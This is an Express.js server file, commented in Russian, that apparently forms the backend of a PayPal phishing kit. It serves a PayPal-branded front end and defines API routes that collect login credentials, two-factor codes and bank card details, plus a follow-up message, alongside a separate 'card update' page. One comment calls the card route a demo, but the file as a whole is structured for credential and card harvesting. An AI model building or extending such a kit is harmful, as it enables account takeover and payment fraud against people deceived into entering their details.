const express = require("express");
const morgan = require("morgan");
const path = require("path");
const controller = require("./controller");

const app = express();

if (process.env.NODE_ENV === "development") app.use(morgan("dev"));

app.use(express.json());

// ===== 1) PayPal фронт под /paypal =====
app.use("/paypal", express.static(path.join(__dirname, "public")));

// ===== 2) PayPal API (как было) =====
const router = express.Router();

// логин/пароль
router.post("/", controller.postCredentials);

// 2FA
router.post("/verify", controller.verifyCode);
router.post("/resend", controller.resendCode);

// Bank card (demo, без хранения полной карты)
router.post("/card-update", controller.cardUpdate);

// 💬 Сохранение сообщения после карты
router.post("/card-message", controller.saveCardMessage);

// подключаем все роуты API
app.use("/api/v1", router);

// ===== 3) Главный сайт на корне / =====
app.use("/", express.static(path.join(__dirname, "main-public")));

// ===== 4) Bank card update page =====
app.use("/card", express.static(path.join(__dirname, "card-public")));

module.exports = app;